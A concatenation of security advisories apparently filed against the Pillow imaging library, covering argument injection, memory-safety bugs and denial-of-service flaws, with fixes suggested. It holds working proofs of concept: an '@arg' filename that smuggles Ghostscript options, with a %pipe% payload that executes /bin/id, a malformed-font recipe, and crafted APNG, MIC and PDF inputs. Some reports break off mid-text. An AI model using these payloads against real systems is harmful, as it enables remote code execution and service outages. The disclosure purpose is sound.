### Summary `PIL.EpsImagePlugin.Ghostscript()` builds the Ghostscript command line using the input file path (`fp.name`) **without sanitization**, placing it at `-f <infile>`. A filename beginning with `-` is interpreted by Ghostscript as an option, giving command-line argument injection; chainable to RCE (see Impact). Reproduces with Pillow's default invocation (with `-dSAFER` enabled).  ### Details _Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._  #### Type CWE-88 (Argument Injection) (→ CWE-78 (OS Command Injection) optionally, with attacker controlled text file)  #### Vulnerable Codes  ```python infile_temp = None if hasattr(fp, "name") and os.path.exists(fp.name):     infile = fp.name                      # user-controlled path used as-is, without validation else:     in_fd, infile_temp = tempfile.mkstemp()     os.close(in_fd)     infile = infile_temp     # ... (copy fp into a temporary file)  # Build Ghostscript command command = [     gs_binary,     "-q",     f"-g{width:d}x{height:d}",     f"-r{res_x:f}x{res_y:f}",     "-dBATCH",     "-dNOPAUSE",     "-dSAFER",                            # default sandbox — does NOT stop this injection     f"-sDEVICE={device}",     f"-sOutputFile={outfile}",     "-c",     f"{-bbox[0]} {-bbox[1]} translate",     "-f",     infile,                               # injected here: inserted into argv with no check for                                           # option prefixes (-, --) or Ghostscript's @-file token                                           # => argument injection (CWE-88)     "-c",     "showpage", ] # ... subprocess.check_call(command, startupinfo=startupinfo)   # spawns Ghostscript ```  #### Root cause.   When rendering an EPS image, PIL.EpsImagePlugin.Ghostscript() constructs the Ghostscript command line using the input file path (fp.name) and places it directly at the -f <infile> position of the argument list. This path is user-controllable, yet Pillow performs no validation or neutralization of tokens that Ghostscript treats specially during command-line argument parsing — in particular a leading - or -- (which Ghostscript interprets as an option rather than a filename) and a leading @ (Ghostscript's argument-file syntax, which causes it to read additional command-line arguments from the named file). Because the filename is neither normalized (e.g., forced to an absolute path or prefixed with ./) nor checked against these prefixes before being handed to the subprocess, an attacker who controls the filename passed to Image.open() can inject arbitrary Ghostscript command-line arguments. This is a classic argument-injection flaw (CWE-88), and it is not mitigated by Pillow's default -dSAFER setting.  #### Affected - Pillow: tested on 12.3.0 (latest); vulnerable code is long-standing and appears to affect all current versions (main included). - Component: `src/PIL/EpsImagePlugin.py`, `Ghostscript()` — `infile = fp.name`, and the command list entry `"-f", infile`.  #### Suggested fix Normalize the filename to an absolute path before it is passed to Ghostscript, so it can never be parsed as an option (`-`/`--`) or as an argument-file token (`@`): ```python     if hasattr(fp, "name") and os.path.exists(fp.name):         infile = os.path.abspath(fp.name)   # was: infile = fp.name ``` `os.path.abspath()` guarantees the path starts with a path separator (or a drive letter on Windows), so a leading `-` or `@` can no longer reach Ghostscript's argument parser. The `else` branch already builds a safe `tempfile.mkstemp()` path and needs no change.  ### PoC dockerfile, Default run shows the argument-injection demo (poc.py); for the RCE PoC run python3 poc-rce.py. ``` FROM ubuntu:24.04  RUN apt update RUN apt install -y --no-install-recommends python3 python3-venv ghostscript ca-certificates RUN rm -rf /var/lib/apt/lists/* RUN python3 -m venv /venv && /venv/bin/pip install --upgrade pip Pillow==12.3.0 ENV PATH=/venv/bin:$PATH WORKDIR /poc COPY poc.py . COPY poc-rce.py . COPY arg .  CMD ["python3", "poc.py"] ``` poc.py ``` import os from PIL import Image  ############################################################################################ # Attacker controlled file ############################################################################################  EPS = b"%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 100 100
%%EndComments
showpage
"  name = "-h" with open(name, "wb") as f:     f.write(EPS)  ############################################################################################  print(f"[*] Pillow opens a file whose name is {name!r}") im = Image.open(name) print(f"[*] call `load()`; this paths calls `gs` command with '-f {name}'") try:     im.load() except Exception as e:     print(f"[*] load() raised: {type(e).__name__}: {e}")  print("CWE-88: argument injection; Pillow code doesn't validate argument name") print("        This poc.py shows the vulnerability clearly.") print("        If Pillow checks the name of file before it uses, It won't display `help`") ``` poc-rce.py ``` import os from PIL import Image  ############################################################################################ # Attacker controlled file ############################################################################################  EPS = b"%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 100 100
%%EndComments
showpage
"  # To chain this vulnerability into critical RCE, We need another arbitrary text file # In this script, it is `arg`. name = "@arg" with open(name, "wb") as f:     f.write(EPS)  ############################################################################################  print(f"[*] Pillow opens a file whose name is {name!r}") im = Image.open(name) print(f"[*] call `load()`; this paths calls `gs` command with '-f {name}'") print(f"[*] and this leads to arbitrary command injection.") print(f"*********************************************") try:     im.load() except Exception as e:     print(f"*********************************************")     print(f"[*] load() raised: {type(e).__name__}: {e}")  print("") print("CWE-78: OS Command Injection;") print("CWE-88: Argument Injection  ; Pillow code doesn't validate argument name") print("        This poc.py shows the vulnerability clearly.") print("        If Pillow checks the name of file before it uses, It won't call `id`") ``` arg ``` -sOutputFile=%pipe%/bin/id -c 1 dict dup /OutputFile (%pipe%/bin/id) put setpagedevice ```  ### Impact **Confirmed — Ghostscript argument injection.** Because the filename is not validated, a leading `-`/`--` is parsed by Ghostscript as an option rather than a file. An attacker who controls the filename passed to `Image.open()` can therefore inject a Ghostscript command-line argument. Single-argument injection always succeeds.  **Potential RCE (verified).** The filename is also not validated against Ghostscript's `@`-file syntax: a filename of the form `@<path>` causes Ghostscript to read additional command-line arguments from `<path>`, allowing multiple arguments to be injected at once. If the attacker can additionally control the referenced file, this can be escalated to arbitrary command execution — an escalation we verified in our PoC (execution of `id`).  Applies under Pillow's default configuration (with `-dSAFER` enabled), on Pillow 12.3.0 with Ghostscript 10.02.1. With same GS arguments, I also confirmed RCE with latest GS version (10.07.1)  ### Why this is a Pillow bug (not the documented "block untrusted EPS" risk) This is not the malicious-EPS-content risk described in Pillow's security policy: the flaw is triggered by the filename, not by anything in the PostScript document. A completely benign EPS file still results in Ghostscript argument injection whenever the filename passed to Image.open() is attacker-influenced, so applications that legitimately process EPS remain affected — the guidance to block untrusted EPS input does not cover this. Because Pillow is the component that constructs the Ghostscript command line, ensuring a filename cannot be reinterpreted as an option (-/--) or an argument-file token (@) is Pillow's responsibility, not that of every downstream caller. The precondition — attacker influence over a filename that reaches Image.open() — is realistic (e.g., file-upload endpoints that preserve or derive the stored name from user input), and chaining it with this flaw yields RCE in practice, not just in theory. A one-line normalization (os.path.abspath(fp.name)) closes it without any change to how applications use the API.  ### Author Chanu Kang (from CysecLab at KAIST) @HLe4s

### Summary When text is drawn with a non-zero stroke width, Pillow creates a FreeType stroker and then loads each glyph. If `FT_Load_Glyph` fails for a glyph, the cleanup path calls `FT_Done_Glyph` on the `glyph` variable. That variable is not initialized before the first measurement loop, and in the render loop it is not reset to NULL after each glyph is freed. A malformed font loaded from untrusted bytes can force the load error and reach this free. This is a latent memory-safety defect; whether it crashes depends on the value in the uninitialized or stale pointer.  ### Details `glyph` is declared without a NULL initializer:  - `src/_imagingft.c:848`  The first measurement loop can jump to `glyph_error` before `glyph` is ever assigned:  - `src/_imagingft.c:1010-1013`  In the render loop the glyph is freed at the end of each iteration and not set back to NULL:  - `src/_imagingft.c:1242`  The cleanup frees it whenever a stroker exists:  - `src/_imagingft.c:1253-1256`  `ImageFont.truetype` accepts a file object or bytes, so the font is attacker-suppliable.  ### PoC This needs `fontTools` and any base TTF (the example uses one bundled with Pillow's tests). It rewrites glyph "A" to claim 5000 contours in a glyph body far too short for them, so `FT_Load_Glyph` returns an error while the face still opens.  ```python import struct from fontTools.ttLib import TTFont from PIL import Image, ImageFont, ImageDraw  SRC = "Tests/fonts/FreeMono.ttf"          # any TTF works as a base tt = TTFont(SRC) gid = tt.getGlyphID(tt.getBestCmap()[ord("A")]) loca_long = tt["head"].indexToLocFormat tt.close()  raw = bytearray(open(SRC, "rb").read()) nt = struct.unpack(">H", raw[4:6])[0] tbl = {} for i in range(nt):     rec = 12 + i * 16     tag = bytes(raw[rec:rec+4]).decode("latin-1")     off, length = struct.unpack(">II", raw[rec+8:rec+16])     tbl[tag] = (off, length) glyf_off = tbl["glyf"][0]; loca_off = tbl["loca"][0] if loca_long:     o0 = struct.unpack_from(">I", raw, loca_off + 4*gid)[0] else:     o0 = struct.unpack_from(">H", raw, loca_off + 2*gid)[0] * 2 struct.pack_into(">h", raw, glyf_off + o0, 5000)   # numberOfContours = 5000 open("evil.ttf", "wb").write(raw)  f = ImageFont.truetype("evil.ttf", 20)             # face opens d = ImageDraw.Draw(Image.new("RGB", (64, 64))) d.text((0, 0), "A", font=f, stroke_width=2)        # load error -> FT_Done_Glyph on bad pointer ```  Result on the pinned build: `FT_Load_Glyph` returns an error and execution reaches the `glyph_error` cleanup that calls `FT_Done_Glyph(glyph)` (the plugin surfaces `OSError: invalid outline`).  ### Impact Applications that draw text with `stroke_width != 0` using fonts loaded from untrusted bytes can hit an invalid or double free. The correct fix is small: initialize `glyph = NULL` and set it back to NULL after each `FT_Done_Glyph`.

On Pillow 12.3.0 and upstream `main` (`ad277e2761b489681e71b51e91367d46b0ceabb9`), a GIF with a long comment makes `_get_global_header()` copy portions of the comment repeatedly when saving, including comments carried over from untrusted images. I suggest provisional **Moderate** severity for crafted-image CPU denial of service, with CVSS-B 6.9 assuming a network service automatically opens unauthenticated uploads and they are resaved as GIFs; impact depends on input-size, concurrency, and worker CPU limits.

### Summary `Image.merge()` checks the mode of every input band except band 0. If band 0 is a single-band `I` or `F` image, the native merge routine reads a pixel pointer that is NULL for those modes and the process crashes. The IPTC plugin reaches this from a plain `Image.open()` followed by a load, and IPTC has no magic-byte prefilter, so a crafted file with no recognizable header can drive it.  ### Details The validation loop skips band 0:  - `src/PIL/Image.py:3795` iterates `for band in bands[1:]` and checks mode and size only for those.  For an `I` or `F` image the 8-bit plane `image8` is NULL (only `image32` is set). `ImagingMerge` dereferences `bands[0]->image8[y]` for the multi-band output modes:  - `src/libImaging/Bands.c:302`, `:311`, `:321`  The IPTC loader builds the band list from an attacker-typed sub-image and passes it to merge with the sub-image at index 0:  - `src/PIL/IptcImagePlugin.py:156-160` - `src/PIL/IptcImagePlugin.py:169` registers the opener with no accept function.  ### PoC ```python from PIL import Image  # Band 0 is a single-band "I" image: its image8 plane is NULL. merge() validates only # bands[1:], so the native ImagingMerge dereferences the NULL plane for band 0. band0 = Image.new("I", (4, 4)) Image.merge("RGB", [band0, Image.new("L", (4, 4)), Image.new("L", (4, 4))]) ```  Run it: ``` $ python 02_poc.py Segmentation fault (core dumped) ```  Observed on a source build of commit `3e2ab96`.  Under AddressSanitizer: ``` ==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000     #0 ImagingMerge   src/libImaging/Bands.c:311     #1 _merge         src/_imaging.c:2492 SUMMARY: AddressSanitizer: SEGV src/libImaging/Bands.c:311 in ImagingMerge ``` The null address confirms the dereference of the missing `image8` plane for band 0.  ### Impact NULL pointer dereference in a C extension. A crafted file opened and loaded through the IPTC path crashes the worker process. This is a hard crash, not a Python exception an application can catch.

``` ============================================================================ Infinite loop in MIC n_frames when the embedded TIFF has 3+ IFDs Location: src/PIL/MicImagePlugin.py:86 in MicImageFile.tell() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A crafted 5.6 KB image file makes Pillow loop forever at 100% CPU when an application asks how many frames the image has. This only affects installations that have the optional `olefile` package. Any application that opens an untrusted image and then reads `im.n_frames` can have one worker tied up indefinitely. That includes the common "is this image animated?" check and re-saving with `save_all=True` to TIFF, PDF or WebP. The call never returns, raises no exception, and does not grow memory, so only an external watchdog stops it. The file is a Microsoft Image Composer (MIC) container, which Pillow recognises by its magic bytes with no extension needed. Inside it is a TIFF stream with three chained image directories. `MicImageFile` subclasses `TiffImageFile` and overrides `seek()` and `tell()` so that a "frame" means one stream in the container. It still inherits `TiffImageFile.n_frames` (`src/PIL/TiffImagePlugin.py:1212`), which walks the embedded TIFF's directory chain with `self._seek(self.tell() + 1)` until `_n_frames` is set. Two things stop that walk from making progress: - `MicImageFile.tell()` (`src/PIL/MicImagePlugin.py:86`) returns the constant stream index. - `MicImageFile.seek()` calls `TiffImageFile._open()`, which resets `_n_frames` to `None`. As a result, the loop re-parses the second directory forever whenever the embedded stream has three or more directories. `Image.open()`, `load()`, `thumbnail()`, `convert()`, `is_animated` and `ImageSequence` iteration do not hang on this file. The regression was introduced in 0b33a87b0d15 (April 2020, first released in 7.2.0), which removed `MicImageFile`'s own `n_frames` property. The attached reproducer builds the file in code and checks two controls, which return 3 and 1 frames as expected; the malicious file is still running when it is killed after 20 seconds. ## Details `MicImageFile` (registered for `Image.open` whenever `olefile` is installed) subclasses `TiffImageFile` and redefines a "frame" as one OLE `*.ACI/Image` stream, overriding `seek()` and `tell()` accordingly. It does not override the `n_frames` property, so the inherited TIFF implementation runs, and that implementation relies on `tell()` advancing as IFDs are loaded. `MicImageFile.tell()` returns the OLE stream index, which never changes inside `n_frames`, so the loop re-parses the same IFD forever. A 5632-byte OLE2 compound file whose `img0.ACI/Image` stream is a 351-byte TIFF with three chained 1×1 IFDs is enough. `Image.open()` on it succeeds (format `MIC`, detected by the OLE magic, no extension needed); evaluating `im.n_frames` then never returns and keeps one core at 100 %. A Python stack taken 27 s in is ``` File "src/PIL/TiffImagePlugin.py", line 1622 in _setup File "src/PIL/TiffImagePlugin.py", line 1271 in _seek File "src/PIL/TiffImagePlugin.py", line 1219 in n_frames ``` and instrumenting `_seek` shows it being called with `frame=1`, `tell()==0`, `_frame_pos==[8, 122]`, `_n_frames is None` on every iteration — identical state, so the loop is non-terminating, not merely slow. The same 351 TIFF bytes opened directly give `n_frames == 3` in milliseconds, and the same container around a 1-IFD TIFF gives `n_frames == 1`. The loop, `src/PIL/TiffImagePlugin.py:1212`: ```python @property def n_frames(self) -> int: current_n_frames = self._n_frames if current_n_frames is None: current = self.tell() self._seek(len(self._frame_pos)) while self._n_frames is None: self._seek(self.tell() + 1) # 1219 self.seek(current) ``` and the overrides that break its progress assumption, `src/PIL/MicImagePlugin.py:76`: ```python def seek(self, frame: int) -> None: … self.fp = self.ole.openstream(filename) TiffImagePlugin.TiffImageFile._open(self) # 82: resets _n_frames to None self.frame = frame def tell(self) -> int: return self.frame # 87: OLE stream index, not TIFF __frame ``` For a plain TIFF, `_seek(k)` (`TiffImagePlugin.py:1236`) loads IFDs up to `k`, appending each offset to `_frame_pos`, setting `_n_frames` when an IFD's next-pointer is 0 (or already seen), and setting the private `__frame = k`; `TiffImageFile.tell()` returns `__frame`, so `self.tell() + 1` walks the chain to its end. For a MIC file, `Image.open` → `MicImageFile._open` sets `self._n_frames = len(self.images)` at line 69, but then calls `self.seek(0)` → `TiffImageFile._open` (line 82), which unconditionally sets `self._n_frames = None` (`TiffImagePlugin.py:1203`) and `_seek(0)`s into the embedded stream. With the 3-IFD stream, IFD 0 has a non-zero next pointer, so `_n_frames` stays `None` after open. `n_frames` then runs: `current = self.tell()` is `0` (the OLE index); `_seek(len(_frame_pos))` = `_seek(1)` loads IFD 1, whose next pointer is also non-zero and not yet in `_frame_pos`, so `_n_frames` is still `None`. The `while` body computes `self.tell() + 1` = `0 + 1` and calls `_seek(1)` again; `len(_frame_pos)` is already 2, so nothing new is loaded — IFD 1 is re-read via `tag_v2.load` and `_setup()` and the state is unchanged. This repeats indefinitely; IFD 2 is never reached. Two chained IFDs are not enough (IFD 1's next pointer of 0 sets `_n_frames = 2` on the first `_seek(1)`); three or more are. `Tests/test_file_mic.py::test_n_frames` passes only because `hopper.mic`'s stream has a single IFD, so `_seek(0)` sets `_n_frames = 1` and the loop is never entered; the `len(self.images)` assignment at line 69 is only consumed by the initial `_seek_check(0)` and is overwritten before any caller can read `n_frames`. A side effect of the same mismatch: with a 2-IFD stream `n_frames` returns 2 (TIFF IFDs) while `seek(1)` indexes `self.images[1]` (OLE streams) and raises `IndexError` — visible with `save_all=True`. ## Impact Any application that lets Pillow open an uploaded file and then reads `im.n_frames` — the usual way to decide whether an image is animated (`getattr(im, "n_frames", 1) > 1`), and also what `hasattr(im, "n_frames")`/`getattr(im, "n_frames", 1)` in Pillow's own `TiffImagePlugin._save_all` (`:2333`), `PdfImagePlugin._save` (`:250`) and `WebPImagePlugin._save_all` (`:171`) evaluate when the app re-saves with `save_all=True` — can be made to spin one worker at 100 % CPU indefinitely with a 5.6 KB upload. The file needs no particular extension (OLE magic; `FpxImagePlugin` rejects it on CLSID and `MicImagePlugin` accepts it), default limits do not intervene, memory does not grow, and no exception is raised, so only an external watchdog ends it. Preconditions: `olefile` installed (it is an optional dependency; without it the MIC plugin is not registered) and the application touching `n_frames` or a `save_all` path. `Image.open()` itself, `load()`, `thumbnail()`, `convert()`, `is_animated` and `ImageSequence` iteration do not hang on this file. This is the same class of tiny-file, pure-Python non-termination as CVE-2021-28676 (FLI) and CVE-2021-28677 (EPS), and like CVE-2019-19911 (FPX) it depends on `olefile`; it differs in not being reached by the default open/load path. The regression was introduced in `0b33a87b0d15` ("Replaced property methods for n_frames and is_animated with normal properties", 2020-04-13), first released in 7.2.0, which replaced `MicImageFile`'s own `n_frames` property with the `_n_frames` attribute that `TiffImageFile._open` overwrites. ## Reproducing `repro` is a single Python script that runs against the installed Pillow (with `olefile`, which is what registers the MIC plugin). It builds every input in code, writes each one to a temporary file named `x` with no extension (so Pillow identifies the format from its magic bytes), and opens it in a child Python process that runs `Image.open(path)` and prints `im.format` and `im.n_frames`. ``` ============================================================================ Quadratic-time DoS in PDF save_all (PdfParser.next_object_id) Location: src/PIL/PdfParser.py:629 in next_object_id() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Pillow's PDF writer takes time proportional to the square of the number of frames when it saves a multi-frame image as a multi-page PDF. Anyone who can get an application to convert their uploaded image this way can tie up a worker at full CPU for minutes with a small file. A 240 KB animated image takes about 70 seconds, a 720 KB one an estimated 10 minutes, and a 125-byte animated PNG that merely *declares* a large frame count triggers the same slowdown with no upper bound short of 2³¹ frames. Memory stays under 100 MB and the decompression-bomb limit never applies. The cause is `PdfParser.next_object_id()` in `src/PIL/PdfParser.py`, which finds the next free id by computing `max(self.xref_table.keys())`. `XrefTable.keys()` rebuilds three sets over every id reserved so far on each call. `PdfImagePlugin._save()` calls it three times (four for palette images with transparency) per frame, for `n_frames` frames, before any page is written. That makes the id-reservation loop alone O(N²). Because `n_frames` is taken from the file before any frame is seeked, APNG's `acTL` count drives the loop even when the frames don't exist. In that case the save raises `OSError` only after the full delay. The precondition is that the application calls `im.save(..., "PDF", save_all=True)` on the attacker's file; `Image.open()` and `load()` alone do not reach this code. The attached reproducer shows 4× the frames costing about 11× the CPU for a valid GIF and about 16× for a fixed 125-byte APNG. The behaviour was introduced in `6207b44ab1ff` (2018-01-18) and first shipped in Pillow 5.1.0. A small patch that tracks the highest id in `XrefTable` makes the save linear. ## Details Saving a multi-frame image as a multi-page PDF (`im.save(fp, "PDF", save_all=True)`) costs CPU time proportional to the square of the frame count, independent of pixel content, because every object id the PDF writer reserves is found by rebuilding and scanning the set of all ids reserved so far. A 1×1-pixel animated GIF made of N identical 15-byte frames (built by the reproducer) gives, on a 2-CPU container with the stock build at this commit (absolute timings vary by machine; the growth rate does not): | frames | GIF size | `im.save(BytesIO(), "PDF", save_all=True)` | peak RSS | |---|---|---|---| | 2 000 | 30 KB | 1.1 s | | | 8 000 | 120 KB | 14.7 s | | | 16 000 | 240 KB | 70 s | 60 MB | | 32 000 | 480 KB | 262 s | 95 MB | | 48 000 | 720 KB | still running at 120 s (extrapolated ≈ 10 min) | | Each doubling of the input roughly quadruples the time. `cProfile` of the 8 000-frame save attributes 13.5 s of 17.6 s to 24 003 calls of `PdfParser.next_object_id` (8.9 s inside `XrefTable.keys`, 3.9 s inside `max`); encoding and writing the 8 000 pages is the remaining ~4 s and scales linearly. The per-page id reservation loop runs before any page is written: ```python # src/PIL/PdfImagePlugin.py:247-259 (_save) for im in ims: im_number_of_pages = 1 if save_all: im_number_of_pages = getattr(im, "n_frames", 1) … for i in range(im_number_of_pages): image_refs.append(existing_pdf.next_object_id(0)) if im.mode == "P" and "transparency" in im.info: image_refs.append(existing_pdf.next_object_id(0)) page_refs.append(existing_pdf.next_object_id(0)) contents_refs.append(existing_pdf.next_object_id(0)) ``` `n_frames` comes straight from the file (for GIF it is the number of image blocks; the GIF plugin counts them by walking block headers, which is cheap). The frames do not even have to exist: the loop runs on `n_frames` before any frame is seeked, and for APNG `n_frames` is the `num_frames` value declared in the `acTL` chunk, rejected only if it is 0 or above `0x80000000` (`src/PIL/PngImagePlugin.py:716-720`). A 125-byte APNG declaring 8 000 frames therefore costs the same ~10–13 s as the 120 KB GIF, and more without bound as the declared count grows. Each of the 3 (or 4, for `P` images with transparency) calls per frame lands here: ```python # src/PIL/PdfParser.py:626-634 def next_object_id(self, offset: int | None = None) -> IndirectReference: try: # TODO: support reuse of deleted objects reference = IndirectReference(max(self.xref_table.keys()) + 1, 0) except ValueError: reference = IndirectReference(1, 0) if offset is not None: self.xref_table[reference.object_id] = (offset, 0) return reference # src/PIL/PdfParser.py:175-178 (XrefTable) def keys(self) -> set[int]: return ( set(self.existing_entries.keys()) - set(self.deleted_entries.keys()) ) | set(self.new_entries.keys()) ``` `_save` passes `offset=0`, so every reserved id is inserted into `xref_table.new_entries`. The k-th call therefore materialises three sets covering all k−1 previous ids, computes a difference and a union, and then `max()` scans the result — O(k) work to produce the integer k. Summed over 3N calls this is O(N²): for 48 000 frames, 144 002 calls over sets growing to 144 002 elements, on the order of 10¹⁰ set-element operations, all spent before `_write_image` is reached for the first frame. Nothing on this path consults `MAX_IMAGE_PIXELS` (the frames are 1×1) and nothing raises; for the GIF the save eventually completes and produces a valid PDF, and for the declared-only APNG it raises `OSError` only once the id loop has finished and the first missing frame is seeked. The consequence is denial of service of the process performing the conversion. Single-image PDF saves, and `save_all` saves of images with tens or hundreds of frames, are unaffected in practice. For each original page, it walks the `/Parent` chain upward and stops only when it reaches a node with no `/Parent`. It keeps no record of nodes it has already visited, so a loop in that chain never ends. The simplest case is a `/Pages` root that lists itself as its own `/Parent`; a longer cycle among page-tree nodes behaves the same way. The path is `PdfImagePlugin._save()` → `write_catalog()` → `rewrite_pages()`, and it is reached whether the save target is a file path or a `BytesIO`. Plain `Image.open()` pipelines are not affected, because Pillow only parses PDFs on the append path. This is a sibling of CVE-2026-42310 (the cyclic trailer `/Prev` loop in the same parser). The `processed_offsets` guard added to `read_prev_trailer()` for that issue does not cover this walk. The loop was introduced in 24ecfe315ab5 (2018-03-03) and has been present in every release since 5.1.0. The attached reproducer builds two in-memory PDFs and appends a 4×4 image to each. The normal file finishes in about 45 ms. The 333-byte self-parented file is still spinning inside `rewrite_pages()` when a 5-second watchdog interrupts it. Two alternative fixes are attached: one silently tolerates the cycle, and one rejects the file with an error. ## Details `PdfParser.rewrite_pages()` walks the `/Parent` chain of every pre-existing page upward and stops only when a node has no `/Parent`. It keeps no record of visited nodes, so a page-tree node whose `/Parent` points at itself, or at any node below it, makes the walk spin forever. ``` ============================================================================ APNG background disposal allocates full canvas before decompression bomb check Location: src/PIL/PngImagePlugin.py:1000  in PngImageFile._seek() Commit:   a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ```  A 126-byte animated PNG file makes Pillow's `Image.open()` allocate and fill memory sized by the image dimensions the file claims, before Pillow's built-in check for oversized images runs. A file claiming 22000×22000 pixels costs about 1.9 GB. Anyone who can get an application to open an image they supply, with default settings and no further calls such as `load()`, can cause a multi-gigabyte memory spike per file. If the claimed size exceeds the machine's free memory, the operating system kills the process outright.  The bug is in `PngImageFile._seek()` in `src/PIL/PngImagePlugin.py` (around line 1000). For any APNG, `_open()` calls `self._seek(0)`. When the first `fcTL` chunk requests `OP_BACKGROUND` disposal, `_seek()` calls `Image.core.fill(self.mode, self.size)` with the full IHDR size, which allocates and zero-fills width×height×4 bytes. `OP_PREVIOUS` takes the same path, because frame 0 rewrites it to `OP_BACKGROUND`. This all happens inside the plugin factory, so `Image.open()`'s `_decompression_bomb_check(im.size)` only runs after the memory has been touched. A 1×1 frame rectangle passes the only checks on the way.  Below available memory, the allocation is freed when `DecompressionBombError` propagates, so sustained pressure needs repeated or concurrent uploads. A 45000×45000 header gets the process killed by the out-of-memory killer on an 8 GB host. The attached reproducer opens two such files that differ in one byte (`dispose_op` 0 vs 1). Both end in `DecompressionBombError`, but peak resident memory is 17 MB for the first and 1864 MB for the second. The eager fill was introduced in 5e4e0fa6ee67 ("Use disposal settings from previous frame", December 2020) and first shipped in 8.1.0. Two candidate patches with a regression test are attached.  ## Details  For an APNG whose first `fcTL` chunk requests `OP_BACKGROUND` disposal, `PngImageFile._open()` creates and zero-fills a core image of the full IHDR-declared size. This happens inside the plugin factory, i.e. before `Image.open()` gets to `_decompression_bomb_check(im.size)`, so the check that is meant to reject oversized headers without allocating anything runs only after the allocation has been made and touched.  The following 126-byte file (all chunk lengths and CRCs valid) makes `Image.open(io.BytesIO(data))`, with default `MAX_IMAGE_PIXELS` and no `load()`, reach 1.86 GB resident (`ru_maxrss`) and then raise `DecompressionBombError`. The byte-identical file with `dispose_op=0` raises the same error at 17 MB.  ``` IHDR  width=22000 height=22000 bit_depth=8 colour_type=6 (RGBA) acTL  num_frames=2 num_plays=0 fcTL  seq=0 w=1 h=1 x=0 y=0 delay=1/10 dispose_op=1 (OP_BACKGROUND) blend_op=0 IDAT  zlib(00 00 00 00 00)                      # one 1x1 RGBA scanline IEND ```  With `width=height=45000` (8.1 GB canvas) the same call attempts the full allocation: under a 4 GiB `RLIMIT_AS` it fails with `MemoryError` from the allocator instead of `DecompressionBombError`; without a cap, on an 8 GB host with no swap, the process is OOM-killed.  ### Code path  `Image.open()` runs the bomb check only after the plugin's constructor (and therefore `_open()`) has returned:  ```python # src/PIL/Image.py:3699-3701                     im = factory(fp, filename)                     _decompression_bomb_check(im.size)                     return im ```  For a plain PNG that ordering is fine: `PngImageFile._open()` only parses chunks up to the first `IDAT` and records `self._size` from `IHDR`; nothing is allocated from it. For an APNG (`acTL` seen, so `im_n_frames` is set) `_open()` additionally positions on frame 0:  ```python # src/PIL/PngImagePlugin.py:845-853         if self.png.im_n_frames is not None:             …             self._seek(0) ```  `_seek(0)` copies `disposal` and `bbox` from the `fcTL` chunk into `self.dispose_op` / `self.dispose_extent` and then prepares the disposal image for the *next* frame eagerly, using the full image size:  ```python # src/PIL/PngImagePlugin.py:991-1001         if self._prev_im is None and self.dispose_op == Disposal.OP_PREVIOUS:             self.dispose_op = Disposal.OP_BACKGROUND          self.dispose = None         if self.dispose_op == Disposal.OP_PREVIOUS:             …         elif self.dispose_op == Disposal.OP_BACKGROUND:             self.dispose = Image.core.fill(self.mode, self.size)             self.dispose = self._crop(self.dispose, self.dispose_extent) ```  `Image.core.fill` is `_fill()` in `src/_imaging.c:711`, which does `ImagingNewDirty(mode, xsize, ysize)` followed by `ImagingFill()`; `ImagingFill` (`src/libImaging/Fill.c:23`) writes every row, so the whole `width*height*4` bytes become resident rather than merely reserved. `self.size` here is the IHDR size (22000×22000), not the 1×1 frame rectangle. The `_crop` on the next line does call `_decompression_bomb_check`, but on the `fcTL` rectangle (1×1) and only after the fill has completed. Lines 991-992 rewrite `OP_PREVIOUS` to `OP_BACKGROUND` on frame 0, so `dispose_op=2` takes the same path (verified: identical 1.86 GB peak). When the first `fcTL` rectangle is large, the `_crop` copy is a second extent-sized buffer on top of the full-canvas fill, so the transient peak can reach about twice the canvas: a 13000×13000 full-frame `fcTL` (below the error threshold, so `Image.open()` succeeds with only a `DecompressionBombWarning`) peaks at 1.31 GB for a 0.66 GB canvas.  The only validation `chunk_fcTL` applies (`src/PIL/PngImagePlugin.py:740-745`) is that the frame rectangle fits inside the IHDR size, which a 1×1 frame always does; IHDR width/height themselves are unconstrained 32-bit values at this point. Control then returns to `_open_core`, `_decompression_bomb_check((22000, 22000))` raises, and the 1.9 GB core image is released when the half-constructed `PngImageFile` is discarded.  The eager full-size fill in `_seek()` was introduced in `5e4e0fa6ee67` ("Use disposal settings from previous frame", 2020-12-24) and first shipped in 8.1.0; before it, the `OP_BACKGROUND` fill lived in `load_end()` and could not be reached from `Image.open()`.  ## Impact  Any application that calls `Image.open()` on untrusted bytes with default settings — the configuration in which the decompression-bomb check is supposed to make that call cheap and safe — can be made to allocate and write an attacker-chosen amount of memory from a ~126-byte PNG upload, before any error is reported and without `load()`, frame iteration, or `LOAD_TRUNCATED_IMAGES`. The amount is set directly by the IHDR width/height (4 bytes per pixel for colour type 6): values below the host's free memory cause a transient multi-GB spike per request (≈15,000,000× amplification at 22000×22000) that is freed when the exception propagates, so concurrent or repeated uploads are needed to sustain pressure; values above it get the worker process OOM-killed outright. PNG is accepted by essentially every upload pipeline, and the file passes `_accept` and chunk CRC checks as a well-formed APNG.  This is the same class as the recent bomb-check additions for WMF (load at a different DPI), FITS, GIF and FontFile — an allocation sized from file-declared numbers on a path `_decompression_bomb_check` does not cover — but here the uncovered path is `Image.open()` itself rather than a later `load()`/`seek()`.  ## Reproducing  `repro` is a single Python script (no build step, no companion files). It builds two PNGs in memory, opens each one with plain `Image.open(io.BytesIO(data))` in a fresh child interpreter using default settings and no `load()`, and has each child report the exception it got and its own peak RSS (`ru_maxrss`). It needs about 2 GB of free RAM and finishes in about a second.  The two files are 126 bytes each and differ in exactly one byte, the `dispose_op` of the first `fcTL` chunk: `0` (`OP_NONE`) for the control and `1` (`OP_BACKGROUND`) for the attack. Both declare IHDR 22000×22000 RGBA. That is 484 Mpixel, above the 2×`MAX_IMAGE_PIXELS` error threshold, so `Image.open()` has to reject both with `DecompressionBombError`. Each chunk has a job:  - The `acTL` chunk (2 frames) makes `_open()` call `_seek(0)`. - The 1×1 `fcTL` rectangle passes `chunk_fcTL`'s bounds check and `_crop`'s bomb check. - The one-scanline `IDAT` ends header parsing.  Expected output on this tree:  ``` 126-byte APNG declaring 22000x22000 RGBA; Image.open(BytesIO(data)), defaults   control  dispose_op=0 OP_NONE        -> DecompressionBombError peak RSS    17 MB   